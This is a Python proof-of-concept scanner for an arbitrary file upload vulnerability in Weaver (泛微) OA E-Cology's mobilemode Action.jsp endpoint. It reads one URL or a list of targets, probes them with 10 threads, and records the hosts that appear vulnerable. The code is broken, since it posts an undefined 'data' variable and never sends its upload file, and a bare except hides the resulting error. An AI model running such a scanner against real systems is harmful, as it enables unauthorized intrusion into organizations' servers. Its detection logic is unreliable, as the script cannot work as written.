# 泛微OA E-Cology action.jsp 任意文件上传漏洞
import requests
import argparse
import sys
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def main():
    parser = argparse.ArgumentParser(description="泛微OA E-Cology action.jsp 任意文件上传漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for line in f.readlines():
                url_list.append(line.strip())
        mp = Pool(10)  # 调整为10个线程，视具体情况调整线程数
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = '/mobilemode/Action.jsp?invoker=com.weaver.formmodel.mobile.ui.servlet.MobileAppUploadAction&action=image'
    # url = target + payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Content-Type': 'application/json',
    }
    proxies={
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    files = {
        'upload': ('111.txt', '1111', 'text/plain')
    }
    try:
        res = requests.get(url=target, verify=False, timeout=10)
        if res.status_code == 200:
            response = requests.post(url=target+payload, data=data, headers=headers, verify=False, timeout=5,proxies=proxies)
            if response.status_code == 200 and 'success' in response.text:
                print(f"[+] 该网址存在任意文件上传漏洞: {target}")
                with open('result.txt', 'a') as f:
                    f.write(target + '\n')
            else:
                print(f"[-] 该网址不存在任意文件上传漏洞: {target}")
        else:
            print(f"[*] 无法访问目标网址: {target}")
    except Exception as e:
       pass

if __name__ == '__main__':
    main()
